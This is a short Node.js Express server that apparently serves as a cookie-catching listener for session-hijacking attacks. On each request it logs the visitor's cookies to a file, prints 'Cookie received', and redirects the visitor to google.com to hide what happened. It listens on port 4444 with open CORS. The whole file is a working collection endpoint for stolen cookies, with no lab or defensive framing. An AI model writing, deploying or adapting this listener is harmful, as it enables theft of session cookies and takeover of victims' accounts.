import express from "express";
import cookieParser from "cookie-parser";
import cors from "cors";
import fs from "fs";

const app = express();

app.use(cookieParser());
app.use(cors());

app.get("/", (req, res) => {
  const cookies = JSON.stringify(req.cookies);

  fs.writeFile("./log/cookies.log", cookies, (err) => {
    if (err) {
      console.error(err);
      return res.sendStatus(500);
    }
    console.log(`\n<== Cookie received ==>`);
  });

  res.status(200).redirect("https://google.com");
});

const PORT = process.env.PORT || 4444;
app.listen(PORT, () => {
  console.log(`\nRunning... :${PORT}`);
});
